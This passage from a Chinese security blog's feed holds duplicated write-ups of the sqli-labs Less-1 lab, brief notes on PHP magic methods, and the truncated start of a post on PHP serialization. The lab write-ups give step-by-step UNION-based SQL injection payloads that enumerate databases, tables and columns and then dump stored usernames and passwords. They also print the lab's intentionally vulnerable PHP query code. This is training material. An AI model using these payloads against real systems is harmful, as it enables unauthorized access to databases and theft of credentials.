    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1(Basic Challenges)"></a>Page-1(Basic Challenges)</h1><p><img src="https://s2.ax1x.com/2020/02/19/3VCLe1.png" alt="3VCLe1.png"></p><h2 id="Less-1（GET方式-基于单引号-string型）"><a href="#Less-1（GET方式-基于单引号-string型）" class="headerlink" title="Less-1（GET方式-基于单引号-string型）"></a>Less-1（GET方式-基于单引号-string型）</h2><p><img src="https://s2.ax1x.com/2020/02/19/3VCHy9.png" alt="3VCHy9.png"><br>根据页面提示：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure><p>尝试通过get方式输入ID和数值参数：<br>[3]:(3)<br><img src="https://s2.ax1x.com/2020/02/19/3VCbLR.png" alt="3VCbLR.png"><br>可以看到给出了相应的login name 和password;</p><hr><p>再添加一个单引号看看：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">' at line 1</span></span><br></pre></td></tr></table></figure><p>得到了报错信息，说明数据库将我们所输入的“ ‘ ”当作了SQL语句的一部分处理了 ,单引号未被过滤产生不匹配错误 ，那么就可以以此闭合前面内容，恶意补充后面内容达到SQL注入。</p><p>此时大致可以猜测出查询语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">//<span class="keyword">limit</span> <span class="number">0</span>，<span class="number">1</span>:只显示第一项</span><br></pre></td></tr></table></figure><hr><p>再确认一下我们的想法，查询语句是否被执行：<br><a href="(1)">1</a>: (4)<br><img src="https://s2.ax1x.com/2020/02/22/3QW1JA.png" alt="3QW1JA.png"></p><p>可以看到确实被执行了；</p><hr><p>此时，输入–+将SQL后面的语句注释掉，页面回显正常，证明是单引号字符型注入；<br><a href="(1)">1</a>: (5)<br><a href="https://imgchr.com/i/3QWqeO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/22/3QWqeO.png" alt="3QWqeO.png"></a></p><p><font color="#00ffff" size="4">注意：</font>– （–空格）在SQL内表示注释，在URL中，浏览器会在发送请求的时候把URL末尾的空格舍去，用–+代替时，URL被URL编码后会变为空格（?id=2后的单引号可以不写）；</p><hr><hr><p>==接下来按流程猜解数据库内容：==</p><ol><li><p>猜解数据库表列数</p><p><font color="#ff000" face="黑体" size="4">order  by：</font></p></li></ol><h2 id><a href="#" class="headerlink" title></a><img src="https://s2.ax1x.com/2020/02/23/3lsbYq.png" alt="3lsbYq.png"></h2><p><img src="https://s2.ax1x.com/2020/02/23/3lsHkn.png" alt="3lsHkn.png"></p><p>   可以看到order by 4页面回显报错，order by 3页面回显正常，说明该表一共有3列；</p><hr><ol start="2"><li>判断数据显示位</li></ol><p><a href="https://imgchr.com/i/319mrV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/23/319mrV.png" alt="319mrV.png"></a></p><p>   通过Payload：?id=0’ union select 1,2,3 –+ 可以看到有2，3两个显示位；</p><hr><p>   <strong>使用联合查询，即union select查询的前提即为页面有显示位</strong></p><p>   <font color="#00ffff" size="4">注意：</font>id需改为数据库中不存在的值，一般用-1或0（由于程序在显示数据时通常只会取结果中的第一行数据，查看本题源码，可以看到mysql_fetch_array（）只被调用了一次，而mysql_fetch_array()函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。此时只需让第1位的查询结果为空，即union左边的select命令查询结果为空，那么union右边的查询结果就成为了唯一可打印行）；</p><hr><p>   <font color="#ff000" face="黑体" size="4">关于显示位的补充：</font></p><p>   当我们通过order by 知道了相关表的列数为3，再使用union select 1,2,3 –+查看显示位，回显页面只显示了2，3，即说明该页面只允许显示第2，3位，不显示其他列的信息。而此时我们查询数据库信息就只能通过这两个显示位，union select 查询需要保证字段数一致，不足的补充数字（MySQL）或null。第一位不显示，所以将要查询的语句写在2，3位上便可得到回显。</p><hr><ol start="3"><li><p>利用显示位爆破数据库版本</p><p><font color="#ff000" face="黑体" size="4">?id=-1’ union select 1,version(),3 –+</font></p></li></ol><p><img src="https://s2.ax1x.com/2020/02/23/31PNND.png" alt="31PNND.png"></p><hr><ol start="4"><li><p>利用显示位爆破数据库名</p><p><font color="#ff000" face="黑体" size="4">?id=-1’ union select 1,2,database() –+</font></p></li></ol><p><img src="https://s2.ax1x.com/2020/02/23/31VU4f.png" alt="31VU4f.png"></p><p>   得到当前数据库名为security；</p><hr><p>   查询所有数据库名：</p><p>   <font color="#ff0000" face="黑体" size="4">?id=-1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+</font><br> <font color="#ff0000" size="4">补充：</font></p><hr><p><strong>information_schema:数据库是MySQL自带的，它提供了访问数据库元数据的方式。即信息数据库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。是一个虚拟数据库，物理上并不存在。</strong></p><p><strong>schemata表:具有数据库中的库的信息，详细记录了某个库的名称，默认编码，排序规则。</strong></p><table><thead><tr><th>字段</th><th>表示</th></tr></thead><tbody><tr><td>schema_name</td><td>数据库名</td></tr><tr><td>default_character_set_name</td><td>数据库编码</td></tr><tr><td>default_collation_name</td><td>数据库排序规则</td></tr><tr><td><a href="(1)">1</a>: (11)</td><td></td></tr></tbody></table><p><img src="https://s2.ax1x.com/2020/02/23/31VGDA.png" alt="31VGDA.png"></p><p>   得到8个数据库，分别为：information_schema,challenges,dvwa,easysql,mysql,performance_schema,security,test；</p><hr><ol start="5"><li>利用显示位爆破表名，此处我们查security数据库中的表名</li></ol><ul><li><p>方法1(逐个列出表名)</p><p> <font color="#ff000" face="黑体" size="4">?id=-1’ union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 –+</font></p></li></ul><p><strong>information_schema.tables存储了数据表的详细元数据信息</strong><br><strong>常用字段</strong></p><table><thead><tr><th>字段</th><th>表示</th></tr></thead><tbody><tr><td>table_schema</td><td>数据库名</td></tr><tr><td>table_name</td><td>数据表名</td></tr><tr><td>engine</td><td>存储引擎</td></tr><tr><td>data_length</td><td>表的大小（单位字节）</td></tr><tr><td>table_rows</td><td>表的行数</td></tr><tr><td>row_format</td><td>查看数据表是否压缩过</td></tr><tr><td>index_length</td><td>表的索引的大小（字节）</td></tr></tbody></table><p><font color="#00ffff" size="4">注意：</font>查询information_schema中的信息时，使用where语句，那个值不能直接用字母，要用单引号包裹或者用其十六进制表示，数值类型的就不用单引号了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">security的十六进制转换是：0x7365637572697479</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/23/31QoAH.png" alt="31QoAH.png"><br>可看到，该页面只回显了一个表，我们可以使用limit来依次列举：<br> <font color="#ff000" face="黑体" size="4">?id=-1’ union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0，1–+</font></p><p><img src="https://s2.ax1x.com/2020/02/23/31Qb9I.png" alt="31Qb9I.png"><br>[17]:(17)<br><img src="https://s2.ax1x.com/2020/02/23/31Q74A.png" alt="31Q74A.png"></p><hr><ul><li>方法2<br>我们直接使用 group_concat函数，将group by产生的同一个分组中的值连接起来，返回一个字符串结果。<br> <font color="#ff000" face="黑体" size="4">?id=-1’union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3–+</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/23/31VdC8.png" alt="31VdC8.png"><br>   得到3个表，分别为：emails,referers,uagents,users；</p><hr><ol start="6"><li><p>利用显示位爆破列名，此处我们查询users表里的列</p><p><font color="#ff000" face="黑体" size="4">?id=-1’union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’),3–+</font></p></li></ol><p><img src="https://s2.ax1x.com/2020/02/23/31Vw8S.png" alt="31Vw8S.png"><br>   得到13个列，分别为：user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,username,password；</p><hr><ol start="7"><li><p>利用显示位爆破字段，此处我们查询users表中username和password</p><p><font color="#ff000" face="黑体" size="4">?id=-1’union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)–+</font></p></li></ol><p><img src="https://s2.ax1x.com/2020/02/23/31V0gg.png" alt="31V0gg.png"></p><p>查询其他数据库内容基本同上，此处不再赘述。</p><hr><p>查看源码：</p><p>可以看到，我们所猜测的查询语句正确;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Page-1-Basic-Challenges&quot;&gt;&lt;a href=&quot;#Page-1-Basic-Challenges&quot; class=&quot;headerlink&quot; title=&quot;Page-1(Basic Challenges)&quot;&gt;&lt;/a&gt;Pag
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs-Page-1-Less-1</title>
    <link href="https://singlemindedt.github.io/2020/02/19/sqli-labs%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>https://singlemindedt.github.io/2020/02/19/sqli-labs闯关记录/</id>
    <published>2020-02-19T08:45:57.000Z</published>
    <updated>2020-02-24T13:24:47.636Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1(Basic Challenges)"></a>Page-1(Basic Challenges)</h1><p><img src="https://s2.ax1x.com/2020/02/19/3VCLe1.png" alt="3VCLe1.png"></p><h2 id="Less-1（get方式-基于单引号-string型）"><a href="#Less-1（get方式-基于单引号-string型）" class="headerlink" title="Less-1（get方式-基于单引号-string型）"></a>Less-1（get方式-基于单引号-string型）</h2><p><img src="https://s2.ax1x.com/2020/02/19/3VCbLR.png" alt="3VCbLR.png"><br>根据页面提示：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure><p>尝试通过get方式输入ID和数值参数：<br>[3]:(3)<br><img src="https://s2.ax1x.com/2020/02/19/3VCbLR.png" alt="3VCbLR.png"><br>可以看到给出了相应的login name 和password;<br>再添加一个单引号看看：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">' at line 1</span></span><br></pre></td></tr></table></figure><p>得到了报错信息，说明数据库将我们所输入的“ ‘ ”当作了SQL语句的一部分处理了 ,单引号未被过滤产生不匹配错误 ，那么就可以以此闭合前面内容，恶意补充后面内容达到SQL注入。</p><p>此时大致可以猜测出查询语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">//<span class="keyword">limit</span> <span class="number">0</span>，<span class="number">1</span>:只显示第一项</span><br></pre></td></tr></table></figure><p>再确认一下我们的想法，查询语句是否被执行：<br><a href="(1)">1</a>: (4)<br><img src="https://s2.ax1x.com/2020/02/22/3QW1JA.png" alt="3QW1JA.png"></p><p>可以看到确实被执行了；</p><p>此时，输入–+将SQL后面的语句注释掉，页面回显正常，证明是单引号字符型注入；<br><a href="(1)">1</a>: (5)<br><a href="https://imgchr.com/i/3QWqeO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/22/3QWqeO.png" alt="3QWqeO.png"></a></p><p><font color="#00ffff" size="4">注意：</font>– （–空格）在SQL内表示注释，在URL中，浏览器会在发送请求的时候把URL末尾的空格舍去，用–+代替时，URL被URL编码后会变为空格（?id=2后的单引号可以不写）；</p><hr><p>==接下来按流程猜解数据库内容：==</p><ol><li><p>猜解数据库表列数</p><p><font color="#ff000" face="黑体" size="4">order  by：</font></p></li></ol><h2 id><a href="#" class="headerlink" title></a><img src="https://s2.ax1x.com/2020/02/23/3lsbYq.png" alt="3lsbYq.png"></h2><p><img src="https://s2.ax1x.com/2020/02/23/3lsHkn.png" alt="3lsHkn.png"></p><p>   可以看到order by 4页面回显报错，order by 3页面回显正常，说明该表一共有3列；</p><hr><ol start="2"><li>判断数据显示位</li></ol><p><a href="https://imgchr.com/i/319mrV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/23/319mrV.png" alt="319mrV.png"></a></p><p>   通过Payload：?id=0’ union select 1,2,3 –+ 可以看到有2，3两个显示位；</p><p>   <strong>使用联合查询，即union select查询的前提即为页面有显示位</strong></p><p>   <font color="#00ffff" size="4">注意：</font>id需改为数据库中不存在的值，一般用-1或0（由于程序在显示数据时通常只会取结果中的第一行数据，查看本题源码，可以看到mysql_fetch_array（）只被调用了一次，而mysql_fetch_array()函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。此时只需让第1位的查询结果为空，即union左边的select命令查询结果为空，那么union右边的查询结果就成为了唯一可打印行）；</p><p>   <font color="#ff000" face="黑体" size="4">关于显示位的补充：</font></p><p>   当我们通过order by 知道了相关表的列数为3，再使用union select 1,2,3 –+查看显示位，回显页面只显示了2，3，即说明该页面只允许显示第2，3位，不显示其他列的信息。而此时我们查询数据库信息就只能通过这两个显示位，union select 查询需要保证字段数一致，不足的补充数字（MySQL）或null。第一位不显示，所以将要查询的语句写在2，3位上便可得到回显。</p><hr><ol start="3"><li><p>利用显示位爆破数据库版本</p><p><font color="#ff000" face="黑体" size="4">?id=-1’ union select 1,version(),3 –+</font></p></li></ol><p><img src="https://s2.ax1x.com/2020/02/23/31PNND.png" alt="31PNND.png"></p><ol start="4"><li><p>利用显示位爆破数据库名</p><p><font color="#ff000" face="黑体" size="4">?id=-1’ union select 1,2,database() –+</font></p></li></ol><p><img src="https://s2.ax1x.com/2020/02/23/31VU4f.png" alt="31VU4f.png"></p><p>   得到当前数据库名为security；</p><p>   查询所有数据库名：</p><p>   <font color="#ff0000" face="黑体" size="4">?id=-1’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+</font><br> <font color="#ff0000" size="4">补充：</font><br><strong>information_schema:数据库是MySQL自带的，它提供了访问数据库元数据的方式。即信息数据库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。是一个虚拟数据库，物理上并不存在。</strong></p><p><strong>schemata表:具有数据库中的库的信息，详细记录了某个库的名称，默认编码，排序规则。</strong></p><table><thead><tr><th>字段</th><th>表示</th></tr></thead><tbody><tr><td>schema_name</td><td>数据库名</td></tr><tr><td>default_character_set_name</td><td>数据库编码</td></tr><tr><td>default_collation_name</td><td>数据库排序规则</td></tr><tr><td><a href="(1)">1</a>: (11)</td><td></td></tr></tbody></table><p><img src="https://s2.ax1x.com/2020/02/23/31VGDA.png" alt="31VGDA.png"></p><p>   得到8个数据库，分别为：information_schema,challenges,dvwa,easysql,mysql,performance_schema,security,test；</p><ol start="5"><li>利用显示位爆破表名，此处我们查security数据库中的表名</li></ol><ul><li><p>方法1(逐个列出表名)</p><p> <font color="#ff000" face="黑体" size="4">?id=-1’ union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 –+</font></p></li></ul><p><font color="#00ffff" size="4">注意：</font>查询information_schema中的信息时，使用where语句，那个值不能直接用字母，要用单引号包裹或者用其十六进制表示，数值类型的就不用单引号了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">security的十六进制转换是：0x7365637572697479</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/23/31QoAH.png" alt="31QoAH.png"><br>可看到，该页面只回显了一个表，我们可以使用limit来依次列举：<br> <font color="#ff000" face="黑体" size="4">?id=-1’ union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0，1–+</font></p><p><img src="https://s2.ax1x.com/2020/02/23/31Qb9I.png" alt="31Qb9I.png"><br>[17]:(17)<br><img src="https://s2.ax1x.com/2020/02/23/31Q74A.png" alt="31Q74A.png"></p><ul><li>方法2<br>我们直接使用 group_concat函数，将group by产生的同一个分组中的值连接起来，返回一个字符串结果。<br> <font color="#ff000" face="黑体" size="4">?id=-1’union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3–+</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/23/31VdC8.png" alt="31VdC8.png"><br>   得到3个表，分别为：emails,referers,uagents,users；</p><ol start="6"><li><p>利用显示位爆破列名，此处我们查询users表里的列</p><p><font color="#ff000" face="黑体" size="4">?id=-1’union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’),3–+</font></p></li></ol><p><img src="https://s2.ax1x.com/2020/02/23/31Vw8S.png" alt="31Vw8S.png"><br>   得到13个列，分别为：user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,username,password；</p><ol start="7"><li><p>利用显示位爆破字段，此处我们查询users表中username和password</p><p><font color="#ff000" face="黑体" size="4">?id=-1’union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)–+</font></p></li></ol><p><img src="https://s2.ax1x.com/2020/02/23/31V0gg.png" alt="31V0gg.png"></p><p>查询其他数据库内容基本同上，此处不再赘述。</p><hr><p>查看源码：</p><p>可以看到，我们所猜测的查询语句正确;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Page-1-Basic-Challenges&quot;&gt;&lt;a href=&quot;#Page-1-Basic-Challenges&quot; class=&quot;headerlink&quot; title=&quot;Page-1(Basic Challenges)&quot;&gt;&lt;/a&gt;Pag
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Magic Methods（魔术函数）</title>
    <link href="https://singlemindedt.github.io/2020/02/13/Magic%E5%87%BD%E6%95%B0/"/>
    <id>https://singlemindedt.github.io/2020/02/13/Magic函数/</id>
    <published>2020-02-13T07:26:35.000Z</published>
    <updated>2020-02-13T07:57:13.177Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>_construct()：构造函数，实列创建时被调用；</p></li><li><p>_destruction()：析构函数，在实例被销毁时被调用；</p></li><li><p>_toString()：对象被当作字符串对待时使用；</p></li><li><p>_sleep()：序列化对象之前调用</p></li><li><p>_wakeup()：反序列化之前调用</p></li><li><p>_call()：调用对象不存在时使用；（为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 _call() 方法来避免。该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。）<br>_get()：通过它可以在对象的外部获取私有成员属性的值；<br><a href="https://www.php.cn/php-weizijiaocheng-199639.html" target="_blank" rel="noopener">相关文献</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;p&gt;_construct()：构造函数，实列创建时被调用；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;_destruction()：析构函数，在实例被销毁时被调用；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;_toString()：对象被当作字符串对待时使用；&lt;/p&gt;
&lt;/l
      
    
    </summary>
    
    
      <category term="PHP" scheme="https://singlemindedt.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP序列化与反序列化</title>
    <link href="https://singlemindedt.github.io/2020/02/13/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://singlemindedt.github.io/2020/02/13/PHP序列化与发序列化/</id>
    <published>2020-02-13T07:26:35.000Z</published>
    <updated>2020-02-21T09:54:34.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><p>serialize（）是将程序中对象的状态信息转换为可存储形式的过程（一般为字符串）<br>例1<strong>(数组变量)</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'name'</span>, <span class="string">'age'</span>, <span class="string">'gender'</span>);</span><br><span class="line">$serialized_data = serialize($arr);</span><br><span class="line"><span class="keyword">echo</span>  $serialized_data;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"name"</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">"age"</span>;i:<span class="number">2</span>;s:<span class="number">6</span>:<span class="string">"gender"</span>;&#125;</span><br></pre></td></tr></table></figure><p>其中各字符含义：<br>a:表示数据类型，此处为array；<br>a:3中的3表示数组元素的个数（name,age,gender）；<br>i:表示整型int;<br>i:0中的0：表示数组元素的下标（序）；<br>s:表示string（数组值的类型)；<br>s:4中的4：表示数组值的长度；</p><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不同数据类型：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'name'</span>, <span class="string">'age'</span>, <span class="number">66</span>,<span class="number">233</span>);</span><br><span class="line">$serialized_data = serialize($arr);</span><br><span class="line"><span 